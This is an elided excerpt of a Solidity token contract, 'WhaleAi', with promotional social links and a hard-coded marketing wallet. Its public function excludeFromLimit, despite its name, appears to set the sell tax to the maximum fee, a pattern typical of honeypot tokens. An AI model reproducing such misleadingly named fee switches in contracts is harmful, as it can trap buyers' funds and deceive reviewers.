...
/*
Telegram : https://t.me/WhaleAiErc20
Twitter : https://twitter.com/WhaleAiErc20  
**/
// 
...
contract WhaleAi is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = "WhaleAi";
    string private _symbol = "WHALE AI";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress =
        payable(0x6015d6961e88A5a8f8eA164F94652AD58d35B65C);
    ...
    function excludeFromLimit(address holder,bool value)public returns (bool)
    {
        ...
        _totalTaxIfSelling = possibleMaxFee;
        return true;
    }
